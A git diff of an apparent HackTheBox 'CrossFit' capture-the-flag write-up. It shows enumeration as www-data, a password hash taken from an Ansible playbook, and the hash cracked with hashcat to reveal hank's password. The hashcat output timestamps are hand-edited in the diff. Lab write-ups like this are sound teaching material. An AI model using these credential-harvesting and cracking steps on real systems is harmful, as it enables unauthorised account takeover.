@@ -884,6 +884,8 @@ After a little bit of waiting, I got a shell back on my waiting netcat listener!
 Before starting my netcat listener I did some setup.  First I ran the **`script`** command to log all of my commands and output, and I also used **`bash`** because **`zsh`** has a problem \(at least on my system, not sure if it is a confirmed bug\) where backgrounding the connection and setting **`stty raw -echo`** breaks the shell in a way that I cannot use **`enter`** or control key commands.  If anyone has any feedback on this I would appreciate it!
 {% endhint %}
 
+### Enumeration as `www-data`
+
 ```text
 www-data@crossfit:/run$ ps aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -995,11 +997,11 @@ drwx------ 3 isaac isaac   4096 Mar 21 06:59 .ssh
 drwxrwxrwx 4 isaac admins  4096 May  9  2020 send_updates
 ```
 
-hank had user.txt, now just needed to move laterally to that user to get it
+I saw that `hank` had `user.txt` in his home folder, so now I knew I needed to move laterally to that user to get it.
 
 
 
-
+TODO: Something missing here?
 
 ```text
 www-data@crossfit:/etc/ansible/playbooks$ ls -la
@@ -1024,7 +1026,7 @@ www-data@crossfit:/etc/ansible/playbooks$ cat adduser_hank.yml
         append: yes
 ```
 
-found `adduser-hank.yml` in `/etc/ansible/playbooks` directory with hash 
+After searching for files that had mentioned the user `hank`, I found `adduser-hank.yml` in the`/etc/ansible/playbooks` directory.  This file had a password hash in it that I copied to my machine for cracking.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -1065,8 +1067,8 @@ Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: sha512crypt $6$, SHA512 (Unix)
 Hash.Target......: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCf...C1CZG/
-Time.Started.....: Sun Mar 21 23:09:52 2021 (9 secs)
-Time.Estimated...: Sun Mar 21 23:10:01 2021 (0 secs)
+Time.Started.....: Fri Jan 15 23:09:52 2021 (9 secs)
+Time.Estimated...: Fri Jan 15 23:10:01 2021 (0 secs)
 Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
 Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........:     2873 H/s (8.31ms) @ Accel:64 Loops:512 Thr:1 Vec:4
@@ -1077,11 +1079,11 @@ Restore.Point....: 23562/14344385 (0.16%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
 Candidates.#1....: skorpion -> 211291
 
-Started: Sun Mar 21 23:09:29 2021
-Stopped: Sun Mar 21 23:10:02 2021
+Started: Fri Jan 15 23:09:29 2021
+Stopped: Fri Jan 15 23:10:02 2021
 ```
 
--&gt; `hank:powerpuffgirls`
+Password hashes with `$6` at the beginning are most likely Unix sha512crypt encrypted.  I used this information to quickly crack the hash using hashcat.  It revealed the password to be `powerpuffgirls`.
 
 ### User.txt
 
